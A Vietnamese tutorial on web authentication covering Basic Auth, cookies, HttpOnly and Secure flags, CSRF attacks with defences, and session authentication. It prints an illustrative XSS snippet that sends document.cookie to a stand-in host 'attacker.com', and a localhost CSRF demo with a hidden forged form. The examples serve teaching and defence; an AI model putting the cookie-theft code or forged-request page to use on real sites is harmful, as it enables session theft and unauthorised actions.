# <font color="#fca61c">🥇 Basic Authentication</font>

## <font color="#C0C0C0">🥈 Lý Thuyết</font>

**<font color="#15cf24">Authentication</font>** là quá trình xác thực người dùng. Nó giúp chúng ta biết được người dùng là ai, và có quyền truy cập vào các tài nguyên nào.

**<font color="#15cf24">Authorization</font>** là quá trình xác định người dùng có quyền truy cập vào tài nguyên nào. Nó giúp chúng ta biết được người dùng có quyền truy cập vào tài nguyên nào.

<br>

## <font color="#C0C0C0">🥈 Luồng Hoạt Động</font>

<font color="#15cf24">_Bước 1_</font>: `Client` sẽ gửi một `request` lên `server` chứa thông tin định danh `client` là ai, cái này có thể là username/password, một đoạn mã nào đấy, hoặc là `token`, hoặc là một số thông tin khác.

<font color="#15cf24">_Bước 2_</font>: `Server` sẽ kiểm tra thông tin định danh của `client` với thông tin trong database. Nếu thông tin định danh đúng, `server` sẽ trả về một dấu hiệu gì đó để cho `client` biết là đăng nhập thành công.

<font color="#15cf24">_Bước 3_</font>: `Client` sẽ lưu lại dấu hiệu này, và gửi dấu hiệu này lên `server` mỗi khi `client` muốn truy cập vào các tài nguyên của `server`.

<font color="#15cf24">_Bước 4_</font>: `Server` sẽ kiểm tra dấu hiệu, nếu hợp lệ, `server` sẽ trả về tài nguyên cần thiết.

<br>

## <font color="#C0C0C0">🥈 Basic Authentication</font>

**<font color="#15cf24">Basic Authentication </font>** được coi là phương pháp authentication đơn giản nhất cho một website.

**<font color="#15cf24">Flow Basic Authentication</font>**:

1. Khi bạn truy cập website sử dụng cơ chế `Basic Authentication`, `server` sẽ kiểm tra `Authorization` trong `HTTP header`. Nếu `Authorization` không hợp lệ, `server` sẽ trả về một `response` với `WWW-Authenticate` nằm trong `header`. Cái này nó sẽ làm website bạn hiển thị popup yêu cầu bạn nhập username/password.

2. Bạn nhập username/password, bạn nhấn OK thì trình duyệt sẽ tiến hành mã hóa (encode) username/password thành một chuỗi `base64` theo quy tắc username:password, và gửi lên `server` thông qua `HTTP header Authorization`.

3. `Server` sẽ kiểm tra và giải mã `Authorization` trong `HTTP header`. Nếu hợp lệ, `server` sẽ trả về thông tin website, nếu không hợp lệ, `server` sẽ trả về một popup yêu cầu bạn nhập lại username/password.

![Alt text](image.png)

![Alt text](image-1.png)

```js
const express = require('express')
const app = express()
const port = 3000

// Hàm xác thực Basic Authentication
function authenticate(req, res, next) {
  const authHeader = req.headers.authorization

  console.log(authHeader) // Basic dXNlcm5hbWU6cGFzc3dvcmQ=

  if (authHeader) {
    // Giải mã chuỗi base64
    const auth = Buffer.from(authHeader.split(' ')[1], 'base64').toString().split(':')
    const username = auth[0]
    const password = auth[1]

    if (username === 'username' && password === 'password') {
      return next()
    }
  }

  // WWW-Authenticate sẽ giúp trình duyệt hiển thị popup đăng nhập
  // Ở đây, Basic chỉ ra rằng máy chủ yêu cầu xác thực Basic Authentication.
  // realm (optional) là một thuộc tính tùy chọn mô tả phạm vi bảo mật của tài nguyên được yêu cầu.
  // Giá trị cái realm này chỉ để mô tả thôi, không có cũng được
  res.setHeader('WWW-Authenticate', 'Basic realm="example"')
  res.status(401).send('Authentication required')
}

// Sử dụng hàm xác thực cho tất cả các route
app.use(authenticate)

// Route chào mừng
app.get('/', (req, res) => {
  res.send('Chào mừng bạn đến với ứng dụng Node.js sử dụng Basic Authentication!')
})

// Khởi chạy máy chủ
app.listen(port, () => {
  console.log(`Máy chủ đang chạy tại http://localhost:${port}`)
})
```

<br>

### <font color="#cd7f32">🥉 Ứng dụng Basic Authentication</font>

- <font color="#15cf24">Usecase 1</font>: Dự án website của bạn khi release thì có 2 môi trường là `staging` và `production`. Vì là môi trường `staging`, vẫn còn đang trong giai đoạn phát triển, nên bạn muốn chỉ cho những người trong nhóm phát triển truy cập vào website. Vậy thì bạn có thể sử dụng `Basic Authentication` để yêu cầu người dùng phải nhập username/password để truy cập vào website. Đỡ phải code thêm một chức năng đăng nhập phức tạp 😂.

- <font color="#15cf24">Usecase 2</font>: Bạn có trang quản lý với `url` là /admin. Bạn không muốn mấy thằng táy máy vô login liên tục trong form đăng nhập của bạn. Vậy nên bạn có thể sử dụng thêm 1 lớp `Basic Authentication` để yêu cầu người dùng phải nhập username/password để truy cập vào trang quản lý.

<br>

### <font color="#cd7f32">🥉 Ưu điểm - Nhược điểm</font>

- <font color="#15cf24">Pros</font>

  - Đơn giản, dễ hiểu, dễ triển khai. Làm được trên Nginx hay Apache luôn cũng được, không cần can thiệp vào code backend.

- <font color="#15cf24">Cons</font>

  - Không an toàn, vì username/password được mã hóa bằng `Base64`. Kẻ gian có thể đánh cắp đoạn mã `base64` này thông qua việc bắt `request` (Tấn công Man-in-the-middle). Vậy nên cần phải sử dụng `HTTPS` để mã hóa giao tiếp giữa `client` và `server`.

  - Thiếu tính linh hoạt: `Basic Authentication` không hỗ trợ nhiều cấp độ xác thực, quản lý quyền truy cập, hay gia hạn/ thu hồi quyền truy cập. Điều này giới hạn khả năng mở rộng và kiểm soát truy cập trong các ứng dụng phức tạp.

  - Không thể logout khỏi website. Vì `Basic Authentication` chỉ yêu cầu người dùng nhập username/password khi truy cập vào website, nên khi bạn tắt trình duyệt, bạn mới logout ra.

  - Không thể sử dụng được cho các ứng dụng mobile. Vì `Basic Authentication` yêu cầu người dùng nhập username/password, nhưng trên các ứng dụng mobile thì không có giao diện để người dùng nhập username/password.

<br>
 
🆘<font color="#fc1c50">Danger </font>🆘

<font color="#fc1c50"> =========================================================== </font>

- _Tấn công <font color="#fc1c50">Man-in-the-Middle</font> là một phương pháp tấn công mà kẻ tấn công can thiệp vào giao tiếp giữa hai bên mà không được phép, và giữ vai trò trung gian giữa hai bên đó. Khi hai bên trao đổi thông tin qua mạng, kẻ tấn công này chèn mình vào quá trình truyền thông để lấy cắp, thay đổi hoặc đánh cắp thông tin quan trọng._

- _Ví dụ, giả sử `Alice` và `Bob` đang cố gắng trao đổi thông tin mật qua mạng. Kẻ tấn công <font color="#fc1c50">Man-in-the-Middle</font> sẽ tạo ra một kết nối giả mạo với `Alice` và một kết nối giả mạo khác với `Bob`. Như vậy, khi `Alice` gửi thông tin cho `Bob`, thực tế là thông tin đó sẽ được truyền qua kẻ tấn công trước khi đến `Bob`. Kẻ tấn công có thể đọc, sửa đổi hoặc thậm chí xóa thông tin này trước khi gửi đến `Bob`. Khi `Bob` nhận thông tin, anh ta không nhận ra sự can thiệp và tin rằng nó đến từ `Alice`._

- _Kẻ tấn công <font color="#fc1c50">Man-in-the-Middle</font> thường sử dụng các phương pháp như đánh cắp dữ liệu, giả mạo thông tin hoặc thực hiện cuộc trò chuyện giả mạo giữa hai bên để đạt được mục tiêu của mình. Điều quan trọng là kẻ tấn công cần kiểm soát toàn bộ luồng thông tin giữa hai bên mà không bị phát hiện._

- _Để đối phó với tấn công <font color="#fc1c50">Man-in-the-Middle</font>, có một số biện pháp an ninh mà hai bên có thể thực hiện. Đầu tiên, sử dụng các giao thức mạng bảo mật như `SSL/TLS` để mã hóa dữ liệu và xác thực nhận dạng. Thứ hai, kiểm tra chứng chỉ `SSL` và đảm bảo rằng thông tin nhận dạng của một bên được xác minh. Cuối cùng, tránh sử dụng mạng không an toàn hoặc mạng công cộng để truyền thông tin nhạy cảm._

- _Tuy nhiên, kẻ tấn công <font color="#fc1c50">Man-in-the-Middle</font> có thể tinh vi và khó phát hiện, do đó việc duy trì an toàn và cảnh giác là rất quan trọng trong việc truyền thông và giao tiếp qua mạng._

<font color="#fc1c50"> =========================================================== </font>

<br>

# <font color="#fca61c">🥇 Cookie & Session Authentication</font>

## <font color="#C0C0C0">🥈 Cookie</font>

**<font color="#15cf24">Cookie</font>** là một file nhỏ được lưu trữ trên thiết bị user. `Cookie` thường được dùng để lưu thông tin về người dùng website như: tên, địa chỉ, giỏ hàng, lịch sử truy cập, mật khẩu.

<br>

⚠️<font color="#fca61c">Attention</font>⚠️

<font color="#fca61c"> =========================================================== </font>

- _`Cookie` được ghi và đọc theo `domain`._

  - _Ví dụ khi bạn truy cập vào website cá nhân của Được https://duthanhduoc.com, và `server` mình trả về `cookie` thì trình duyệt của bạn sẽ lưu `cookie` cho `domain` duthanhduoc.com_

  - _Khi bạn gửi `request` đến https://duthanhduoc.com (bao gồm việc bạn enter url vào thanh địa chỉ hay gửi api đến) thì trình duyệt của bạn tìm kiếm có `cookie` nào của https://duthanhduoc.com không và gửi lên `server` https://duthanhduoc.com._

  - _Nhưng nếu bạn truy cập vào https://google.com thì google sẽ không đọc được `cookie` bên https://duthanhduoc.com, vì trình duyệt không gửi lên._

<font color="#fca61c"> =========================================================== </font>

<br>

🆘<font color="#fc1c50">Danger</font>🆘

<font color="#fc1c50"> =========================================================== </font>

- _Nếu bạn đang ở trang https://google.com và gửi `request` đến https://duthanhduoc.com thì trình duyệt sẽ tự động gửi `cookie` của https://duthanhduoc.com lên `server` của https://duthanhduoc.com, đây là một lỗ hổng để hacker <font color="fc1c50">tấn công CSRF</font>. Để tìm hiểu thêm về kỹ thuật tấn công và cách khắc phục thì các bạn đọc thêm ở những phần dưới nhé._

<font color="#fc1c50"> =========================================================== </font>

<br>

🆗<font color="#1caafc">Special</font>🆗

<font color="#1caafc"> =========================================================== </font>

- _Một website có thể lưu nhiều `cookie` khác nhau, ví dụ profile, cart, history, .._

- _Bộ nhớ của `cookie` có giới hạn, nên bạn không nên lưu quá nhiều thông tin vào `cookie`. Thường thì một website chỉ nên lưu tối đa `50 cookie` và tổng cộng kích thước của các `cookie` trên website đó không nên vượt quá `4KB`._

<font color="#1caafc"> =========================================================== </font>

<br>

### <font color="#cd7f32">🥉 Nơi Lưu Trữ Cookie</font>

- Nó lưu trong 1 cái `file`, `file` này thì được lưu ở trên ổ cứng của bạn. Vậy nên là bạn tắt trình duyệt, shutdown máy tính đi mở lại thì nó vẫn còn đấy.

- Thường thì không ai vào đây xem đâu, vì nó là `file` nhị phân, bạn không thể đọc được nó. Chúng ta sẽ dùng trình duyệt để xem nhé.

<br>

### <font color="#cd7f32">🥉 Ghi Dữ Liệu Lên Cookie</font>

- Có 3 cách để ghi dữ liệu lên `cookie`:

  - Khi bạn truy cập vào `1 url` hoặc gọi `1 api`, `server` có thể set `cookie` lên máy tính của bạn bằng cách trả về `header` `Set-Cookie` trong `response`.

  - Bạn có thể dùng `javascript` để set `cookie` lên máy tính của bạn thông qua `document.cookie`

  - Bạn có thể dùng trình duyệt, mở devtool lên và `set cookie` lên máy tính của bạn

<br>

### <font color="#cd7f32">🥉 Đọc Dữ Liệu Từ Cookie</font>

- Khi bạn truy cập vào `1 url` hoặc gọi `1 api`, trình duyệt sẽ tự động gửi `cookie` lên `server`. Nhớ là tự động luôn nha, bạn không cần làm gì cả.

- Ngoài ra bạn có thể dùng `Javascript` để đọc `cookie` của bạn:

  ```js
  // Nó sẽ return về tất cả cookie trong một string kiểu như:
  // cookie1=value; cookie2=value; cookie3=value;
  let x = document.cookie
  ```

<br>

⚠️<font color="#fca61c">Attention</font>⚠️

<font color="#fca61c"> =========================================================== </font>

- _Lưu ý là nếu `cookie` được set `HttpOnly` thì bạn không thể đọc được `cookie` bằng Javascript đâu nhé._

- _Lưu ý là `cookie` lưu ở trang nào thì trình duyệt sẽ gửi `cookie` trang đó lên `server` nha. Nếu `cookie` của https://facebook.com thì không có chuyện bạn vào https://duthanhduoc.com và mình đọc được `cookie` facebook của bạn đâu._

<font color="#fca61c"> =========================================================== </font>

<br>

🥑 **<font color="#15cf24">SAMPLE CODE</font>**

- khi bạn chạy đoạn code Node.Js này lên, truy cập vào http://localhost:3000/set-cookie thì trình duyệt sẽ lưu cookie với tên username và giá trị John Doe trong 1 giờ (3600000 ms).

- Khi bạn truy cập vào http://localhost:3000/get-cookie thì trình duyệt sẽ gửi cookie lên server, server sẽ đọc cookie và trả về trang tương ứng cho bạn.

- Đoạn code trên các bạn có thể test bằng axios gọi API với method GET nhé. Chứ nhiều bạn nghĩ là cookie chỉ dùng cho server side rendering truyền thống, không áp dụng được cho RESTful API thì toang 😂, nó vẫn dùng bình thường nhá.

  ```js
  const express = require('express')
  const cookieParser = require('cookie-parser')

  const app = express()

  // Sử dụng cookie-parser để đọc cookie dễ dàng hơn thông qua req.cookies
  app.use(cookieParser())

  // Tạo cookie mới
  app.get('/set-cookie', (req, res) => {
    // Điều này tương tự như res.setHeader('Set-Cookie', 'username=John Doe; Max-Age=3600')
    res.cookie('username', 'John Doe', { maxAge: 3600 * 1000 })
    res.send('Cookie đã được tạo')
  })

  // Đọc cookie
  app.get('/get-cookie', (req, res) => {
    const username = req.cookies.username
    res.send(`Cookie "username" có giá trị là: ${username}`)
  })

  // Trang chủ
  app.get('/', (req, res) => {
    res.send('Xin chào! Hãy tạo hoặc đọc cookie bằng cách truy cập /set-cookie hoặc /get-cookie')
  })

  app.listen(3000, () => {
    console.log('Server is running on port 3000')
  })
  ```

<br>

## <font color="#C0C0C0">🥈 Lưu Ý Khi Dùng Cookie</font>

### <font color="#cd7f32">🥉 HttpOnly</font>

- Khi set `HttpOnly` cho một `cookie` của bạn thì `cookie` đó sẽ không thể đọc được bằng `Javascript` (tức là không thể lấy `cookie` bằng `document.cookie` được). Điều này giúp tránh được <font color="#fc1c50">tấn công XSS.</font>

- <font color="#fc1c50">tấn công XSS</font> hiểu đơn giản là người khác có thể chạy được code `javascript` của họ trên trang web của bạn. Ví dụ bạn dùng một thư viện trên `npm`, người tạo thư viện này cố tình chèn một đoạn code `javascript` như sau

  ```js
  // Lấy cookie
  const cookie = document.cookie

  // Gửi cookie về một trang web khác
  const xhr = new XMLHttpRequest()
  xhr.open('POST', 'https://attacker.com/steal-cookie', true)
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded')
  xhr.send(`cookie=${cookie}`)
  ```

- Khi bạn `deploy` website, user truy cập vào website của bạn, thì đoạn code trên sẽ chạy và gửi `cookie` của user về cho kẻ tấn công (người tạo thư viện). Nếu `cookie` chứa các thông tin quan trọng như tài khoản ngân hàng, mật khẩu, ... thì user đã bị hack rồi.

- Để set `HttpOnly` cho `cookie`, bạn chỉ cần thêm option `httpOnly`: `true` vào `cookie` như sau

  ```js
  // Thiết lập cookie với httponly
  res.cookie('cookieName', 'cookieValue', { httpOnly: true })
  ```

<br>

### <font color="#cd7f32">🥉 Secure</font>

- Khi `set Secure` cho một `cookie` của bạn thì `cookie` đó chỉ được gửi lên `server` khi bạn truy cập vào trang web bằng `https`. Điều này giúp tránh được các <font color="#fc1c50">lỗ hổng MITM (Man in the middle attack)</font>

- <font color="#fc1c50">Man-in-the-middle (MITM)</font> là một kỹ thuật tấn công mạng, trong đó kẻ tấn công can thiệp vào kết nối giữa hai bên và trộn lẫn thông tin giữa họ. Khi bị tấn công, người dùng thường không nhận ra được sự can thiệp này. Ví dụ bạn dùng wifi công cộng, kẻ tấn công có thể đọc được dữ liệu bạn gửi đi.

- Để `set Secure` cho `cookie`, bạn chỉ cần thêm option `secure`: `true` vào `cookie` như sau:

  ```js
  res.cookie('cookieName', 'cookieValue', { secure: true })
  ```

<br>

### <font color="#cd7f32">🥉 Tấn Công CSRF</font>

- Lợi dụng cơ chế khi `request` trên một url nào đó, trình duyệt sẽ tự động gửi `cookie` lên `server`, kẻ tấn công có thể tạo một trang web giả mạo, khi user truy cập vào trang web giả mạo và thực hiện hành động nào đó, trình duyệt sẽ tự động gửi `cookie` lên `server`, kẻ tấn công có thể lợi dụng `cookie` này để thực hiện các hành động độc hại.

- Demo:

  - <font color="#15cf24">_Bước 1_</font>: Tạo 2 file facebook.js và hacker.js như trên
  - <font color="#15cf24">_Bước 2_</font>: Chạy 2 file server trên 2 terminal khác nhau
  - <font color="#15cf24">_Bước 3_</font>: Truy cập vào http://localhost:3000/login để đăng nhập vào facebook
  - <font color="#15cf24">_Bước 4_</font>: Quay trở lại trang chủ http://localhost:3000 để xem đăng nhập thành công chưa
  - <font color="#15cf24">_Bước 5_</font>: Mở 1 tab mới truy cập vào http://127.0.0.1:3300 và nhấn và nút Click vào đây để xem full video
  - <font color="#15cf24">_Bước 6_</font>: Quay lại tab facebook, F5 và xem kết quả, bạn sẽ thấy bên website facebook đã bị hack

- Ví dụ:

  - Chúng ta dùng facebook để post bài lên newfeeeds tại url là https://facebook.com. Tất nhiên là muốn post được bài viết thì facebook sẽ kiểm tra bạn đã đăng nhập hay chưa thông qua `cookie` bạn gửi lên lúc bạn nhấn nút Đăng bài.

  - Dưới đây là đoạn code mô phỏng cách `server` facebook hoạt động khi bạn nhấn nút Đăng bài.

  - File server facebook.js chạy tại http://localhost:3000

    ```javascript
    const express = require('express')
    const cookieParser = require('cookie-parser')
    const bodyParser = require('body-parser')

    const database = []
    const PORT = 3000
    const app = express()

    // Sử dụng cookie-parser để đọc cookie dễ dàng hơn thông qua req.cookies
    app.use(cookieParser())

    // Sử dụng body-parser để đọc body form data dễ dàng hơn thông qua req.body
    app.use(bodyParser.urlencoded({ extended: false }))

    const authMiddleware = (req, res, next) => {
      // Kiểm tra xem người dùng đã đăng nhập chưa
      if (req.cookies.username !== 'John Doe') {
        return res
          .status(401)
          .send(`<div>Xin chào! Để đăng nhập vui lòng vào đường dẫn <a href='/login'>/login</a></div>`)
      }
      next()
    }

    app.get('/login', (req, res) => {
      res.cookie('username', 'John Doe', {
        maxAge: 3600 * 1000,
        httpOnly: true
      })
      res.send(`
      <div>Chúc mừng John Doe đã đăng nhập thành công!</div>
      <div>Quay lại <a href='/'>trang chủ</a> để đăng bài</div>
      `)
    })

    app.post('/status', authMiddleware, (req, res) => {
      // Thêm bài viết vào database
      const { content } = req.body
      database.push(content)
      res.send(`<div>Bạn đã đăng bài thành công, quay lại <a href='/'>trang chủ</a> để xem bài viết của bạn</div>`)
    })

    // Trang chủ
    app.get('/', authMiddleware, (req, res) => {
      // Nếu đã đăng nhập thì hiển thị form đăng bài và các bài đã đăng
      res.send(`
      <html><body>
      <form action='/status' method='post'>
        <textarea type="text" placeholder="Bạn đang nghĩ gì" name="content"></textarea>
        <button type="submit">Đăng bài</button>
      </form>
      <div>Các bài đã đăng</div>
      ${database.map((content) => `<p>${content}</p>`).join('')}
      </body></html>
      `)
    })

    app.listen(PORT, () => {
      console.log(`Facebook Server is running on http://localhost:${PORT}`)
    })
    ```

  - File `server` hacker.js chạy tại http://http://127.0.0.1:3300 (sở dĩ mình không để link localhost vì nó sẽ cũng `domain` với cái `server` facebook trên, nên chúng ta sẽ không test được)

    ```javascript
    const express = require('express')
    const cookieParser = require('cookie-parser')
    const bodyParser = require('body-parser')

    const PORT = 3300
    const app = express()
    app.use(cookieParser())
    app.use(bodyParser.urlencoded({ extended: false }))

    // Trang chứa nội dung dụ dỗ người dùng click
    app.get('/', (req, res) => {
      res.send(`
      <html><body>
      <form action='http://localhost:3000/status' method='post'>
        <input type="text" name="content" value='Tôi hồ đồ quá, tôi đã bị hack' style="display: none" />
        <button type="submit">Click vào đây để xem full video</button>
      </form>
      </body></html>
      `)
    })

    app.listen(PORT, () => {
      console.log(`Hacker Server is running on http://127.0.0.1:${PORT}`)
    })
    ```

<br>

### <font color="#cd7f32">🥉 Chống CSRF</font>

- <font color="#15cf24">_Cách 1_</font>: Sử dụng thuộc tính `SameSite=Strict` cho `cookie`

  - Sửa file facebook.js như sau:

    ```javascript
    res.cookie('username', 'John Doe', {
      maxAge: 3600 * 1000,
      httpOnly: true,
      sameSite: 'Strict'
    })
    ```

  - Với SameSite=Strict thì `cookie` sẽ không được gửi đi nếu `request` không phải là `request` từ trang web hiện tại. Ví dụ như ở trên thì `cookie` sẽ không được gửi đi nếu `request` đến từ http://127.0.0.1:3300

- <font color="#15cf24">_Cách 2_</font>: Sử dụng `CSRF` `Token`

  - `CSRF token` là một chuỗi ngẫu nhiên được tạo ra để bảo vệ khỏi <font color="#fc1c50">tấn công Cross-Site Request Forgery (CSRF)</font>. Khi người dùng yêu cầu truy cập tài nguyên, `server` sẽ tạo ra một `token` và gửi nó về cho người dùng. Khi người dùng gửi yêu cầu tiếp theo, họ phải bao gồm `token` này trong yêu cầu của mình. Nếu `token` không hợp lệ, yêu cầu sẽ bị từ chối. Điều này giúp ngăn chặn kẻ tấn công thực hiện các yêu cầu giả mạo.

  - Để áp dụng `CSRF Token` cho facebook.js server thì các bạn sửa code thành như dưới đây

    ```js
    const express = require('express')
    const cookieParser = require('cookie-parser')
    const bodyParser = require('body-parser')

    const database = []
    const PORT = 3000
    const app = express()

    // Sử dụng cookie-parser để đọc cookie dễ dàng hơn thông qua req.cookies
    app.use(cookieParser())

    // Sử dụng body-parser để đọc body form data dễ dàng hơn thông qua req.body
    app.use(bodyParser.urlencoded({ extended: false }))

    // Middleware này sẽ kiểm tra CSRF Token có hợp lệ hay không
    // Cho các method POST, PUT, DELETE
    const csrfProtection = (req, res, next) => {
      const { csrfToken } = req.body
      const tokenFromCookie = req.cookies.csrfToken
      if (!csrfToken || csrfToken !== tokenFromCookie) {
        return res.status(403).send('CSRF Token không hợp lệ')
      }
      next()
    }

    const authMiddleware = (req, res, next) => {
      // Kiểm tra xem người dùng đã đăng nhập chưa
      if (req.cookies.username !== 'John Doe') {
        return res
          .status(401)
          .send(`<div>Xin chào! Để đăng nhập vui lòng vào đường dẫn <a href='/login'>/login</a></div>`)
      }
      next()
    }

    app.get('/login', (req, res) => {
      res.cookie('username', 'John Doe', {
        maxAge: 3600 * 1000,
        httpOnly: true
      })
      // Tạo ra một token ngẫu nhiên và lưu vào cookie
      const csrfToken = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15)
      res.cookie('csrfToken', csrfToken)

      res.send(`
      <div>Chúc mừng John Doe đã đăng nhập thành công!</div>
      <div>Quay lại <a href='/'>trang chủ</a> để đăng bài</div>
      `)
    })

    // Đưa csrfProtection vào những route cần bảo vệ
    app.post('/status', authMiddleware, csrfProtection, (req, res) => {
      // Thêm bài viết vào database
      const { content } = req.body
      database.push(content)
      res.send(`<div>Bạn đã đăng bài thành công, quay lại <a href='/'>trang chủ</a> để xem bài viết của bạn</div>`)
    })

    // Trang chủ
    app.get('/', authMiddleware, (req, res) => {
      const tokenFromCookie = req.cookies.csrfToken

      // Nếu đã đăng nhập thì hiển thị form đăng bài và các bài đã đăng
      res.send(`
      <html><body>
      <form action='/status' method='post'>
        <textarea type="text" placeholder="Bạn đang nghĩ gì" name="content"></textarea>
        <input type="hidden" name="csrfToken" value="${tokenFromCookie}" />
        <button type="submit">Đăng bài</button>
      </form>
      <div>Các bài đã đăng</div>
      ${database.map((content) => `<p>${content}</p>`).join('')}
      </body></html>
      `)
    })

    app.listen(PORT, () => {
      console.log(`Facebook Server is running on http://localhost:${PORT}`)
    })
    ```

- <font color="#15cf24">_Cách 3_</font>: Sử dụng `CORS`

  - `Cross-Origin Resource Sharing (CORS)` là một cơ chế để ngăn chặn các yêu cầu từ các tên miền khác nhau. Bằng cách thiết lập `CORS`, bạn có thể chỉ cho phép các yêu cầu từ các tên miền cụ thể hoặc từ tất cả các tên miền. Ví dụ như ở trên thì nếu `server` facebook chỉ cho phép các yêu cầu từ tên miền http://localhost:3000 thì hacker sẽ không thể tấn công được.

  - Thêm cái này vào facebook.js:

    ```js
    const cors = require('cors')
    app.use(cors({ origin: 'http://localhost:3000', credentials: true }))
    ```

<br>

⚠️<font color="#fca61c">Attention</font>⚠️

<font color="#fca61c"> =========================================================== </font>

- _Quy tắc quyết định 2 site có phải là same không nó phức tạp hơn bạn nghĩ._

- _Ví dụ như 2 site https://edu.duthanhduoc.com và http://duthanhduoc.com được coi là same site vì cùng public suffix duthanhduoc.com_

- _Nhưng 2 site https://duthanhduoc.github.io và https://dtd.github.io thì không được coi là same site vì khác public suffix, ở đây các bạn có thể hiểu github.io nó giống như cái tên miền com rồi._

- _Để hiểu rõ hơn về samesite thì mình khuyên các bạn nên đọc những bài này_

  - _https://betterprogramming.pub/handling-samesite-cookie-attacks-664184811e39_
  - _https://web.dev/samesite-cookies-explained/_
  - _https://jub0bs.com/posts/2021-01-29-great-samesite-confusion/_

<font color="#fca61c"> =========================================================== </font>

<br>

🆗<font color="#1caafc">Special</font>🆗

<font color="#1caafc"> =========================================================== </font>

- `Single Page Application` có bị <font color="#fc1c50">tấn công Cross-Site Request Forgery (CSRF)</font> không ?

  - Câu trả lời là có! Nhưng hiếm khi xảy ra trừ khi bạn chủ động `set SameSite=None` cho `cookie` của bạn.

  - Như các bạn thấy thì `CSRF` nghĩa là một `request` được thực hiện trên một trang web hacker. Nãy giờ chúng ta chỉ ví dụ với cơ chế `GET` `POST` truyền thống, chứ không phải `REST API` phổ biến như chúng ta thao tác ngày nay.

  - Với `REST API` thì để gửi một request đến http://localhost:3000/status trên trang web http://127.0.0.1:3300 chúng ta có thể dùng `fetch API` như dưới đây.

    ```js
    fetch('http://localhost:3000/status', {
      method: 'POST',
      credentials: 'include',
      body: {
        content: 'Hacker đã đăng bài'
      }
    })
    ```

  - Lúc này `cookie` của http://localhost:3000 sẽ không được gửi lên http://localhost:3000/status đâu, vì nếu các bạn không set `SameSite` khi `server` trả về thì mặc định trình duyệt sẽ ngầm hiểu đây là `SameSite=Lax.`

  - Mà với `SameSite=Lax `thì chỉ cho phép gửi `cookie` đối với những `request` mà reload lại page (ví dụ `request` trong form method `post` truyền thống ở các ví dụ trên), còn mấy cái `fetch`, `XMLHttpRequest` hay `axios` thì nó không gửi `cookie` đâu.

  - Còn nếu bạn set `SameSite=none` (khi đó phải thêm `secure=true` nữa browsers nó mới chập nhận cái `samesite none` này) thì khỏi nói luôn, hacker có thể thay đổi data của bạn nếu bạn truy cập trang web của hacker.

<font color="#1caafc"> =========================================================== </font>

<br>

🥑 **<font color="#15cf24">Tóm Tắt</font>**

<font color="#15cf24"> =========================================================== </font>

- _Nếu bạn không dùng `cookie` thì không cần quan tâm, vì <font color="#15cf24">\_no cookie no CSRF_</font>\_

- _Nếu bạn sài combo `REST API` và `SPA` thì đầu tiên là phải thiết lập `cors`, `httpOnly=true`, `secure=true`, `SameSite=Strict` hoặc `SameSite=Lax`._

- _Cẩn thận với `SameSite=Strict`:_

- _Vì nếu bạn set `SameSite=Strict` thì khi bạn đăng nhập vào example.com rồi. Bây giờ bạn click vào đường link example.com trên trang web khác thì trình duyệt sẽ không gửi `cookie` đâu, dẫn đến việc dù bạn đã đăng nhập lúc nãy nhưng vẫn bị chuyển về trang login vì bị cho là chưa đăng nhập._

- _Cái này thường xảy ra khi website của bạn là website theo `MPA` truyền thống, còn nếu là `SPA` thì không sao cả, vì hầu như các `SPA` chúng ta đều gọi `request` và gửi `cookie` lên `server` thông qua `fetch` hay `XMLHttpRequest` (tức là đã redirect đến trang) chứ không phải ngay khi click vào đường link._

- _Cá nhân mình nghĩ không cần phải dùng thêm `CSRF token` nữa, vì nó chỉ làm cho cơ chế xác thực của bạn phức tạp hơn thôi. Như trên là đủ rồi._

<font color="#15cf24"> =========================================================== </font>

<br>

## <font color="#C0C0C0">🥈 Session Authentication</font>

<font color="#15cf24">Session</font> là phiên lưu trữ trên `server` để quản lý thông tin liên quan đến mỗi người dùng trong quá trình tương tác với ứng dụng.

<font color="#15cf24">Session</font> được lưu trữ trên `server`, còn `cookie` được lưu trữ trên `client`. Nhớ rõ điều này nha.

<font color="#15cf24">Session</font> có thể được lưu ở dạng `file`, `database`, `cache`, `memory`, ... tùy vào cách thiết kế `server` như thế nào.

<br>

### <font color="#cd7f32">🥉 Session Authentication là gì ?</font>

- <font color="#15cf24">Session Authentication</font> là một cơ chế xác thực người dùng bằng cách sử dụng `session`.

- Khi người dùng đăng nhập thành công, `server` sẽ tạo ra một `session` mới và gửi `session id` đó về cho client thông qua `cookie` (thường là `cookie` thôi chứ không nhất thiết, client có thể lưu vào `local storage` cũng được). `Client` sẽ gửi nó lên `server` mỗi khi thực hiện một `request`. `Server` kiểm tra `session id` này có tồn tại hay không, nếu có thì xác thực thành công, không thì xác thực thất bại.

<br>

### <font color="#cd7f32">🥉 Flow hoạt động của Session Authentication</font>

![Alt text](image-2.png)

- <font color="#15cf24">_Bước 1_</font>: `Client` gửi `request` vào tài nguyên được bảo vệ trên `server`. Nếu `client` chưa được xác thực, `server` sẽ trả lời với một lời nhắc đăng nhập. `Client` gửi username và password của họ cho `server`.

- <font color="#15cf24">_Bước 2_</font>: `Server` xác minh thông tin xác thực được cung cấp so với cơ sở dữ liệu người dùng. Nếu thông tin xác thực khớp, `server` tạo ra một `Session Id` duy nhất và tạo một `session` tương ứng trong bộ nhớ lưu trữ phía `server` (ví dụ: `ram`, `database`, hoặc `file` nào đó).

- <font color="#15cf24">_Bước 3_</font>: `Server` gửi `Session Id` cho `client` dưới dạng `cookie`, thường là với tiêu đề `Set-Cookie`.

- <font color="#15cf24">_Bước 4_</font>: `Client` lưu trữ `cookie`.

- <font color="#15cf24">_Bước 5_</font>: Đối với các yêu cầu tiếp theo, `client` gửi `cookie` chứa `Session Id` lên `server`.

- <font color="#15cf24">_Bước 6_</font>: `Server` kiểm tra `Session Id` trong `cookie` so với dữ liệu `session` được lưu trữ để xác thực người dùng.

- <font color="#15cf24">_Bước 7_</font>: Nếu được xác nhận, `server` cấp quyền truy cập vào tài nguyên được yêu cầu. Khi người dùng đăng xuất hoặc sau một khoảng thời gian hết hạn được xác định trước, `server` làm vô hiệu phiên

<br>

🥑 **<font color="#15cf24">SAMPLE CODE</font>**

```js
// Import các thư viện cần thiết
const express = require('express')
const cookieParser = require('cookie-parser')

// Tạo ứng dụng Express
const app = express()

// Sử dụng các middleware
app.use(express.json()) // Để đọc dữ liệu JSON từ request body
app.use(cookieParser()) // Để đọc dữ liệu từ cookie

// Dữ liệu người dùng giả lập
const users = {
  user1: 'password1',
  user2: 'password2'
}

// Lưu trữ các session
const sessions = {}

// Middleware để kiểm tra xác thực người dùng
